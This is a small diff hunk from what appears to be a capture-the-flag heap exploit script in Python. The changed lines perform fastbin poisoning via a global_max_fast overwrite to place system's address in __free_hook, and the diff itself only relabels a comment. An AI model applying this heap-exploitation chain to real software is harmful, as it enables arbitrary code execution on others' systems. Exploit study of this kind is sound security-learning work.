@@ -61,7 +61,7 @@ print("libc_base =", hex(libc_base))
 Change(0, p64(libc_leak) + p64(global_max_fast - 0x10))
 Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "C") #2
 
-# tcache poisoning
+# fastbin poisoning
 Lose(2)
 Change(0, p64(system_addr))
 Obtain((FREE_HOOK - MAIN_ARENA)*2-0x10, "D") #3
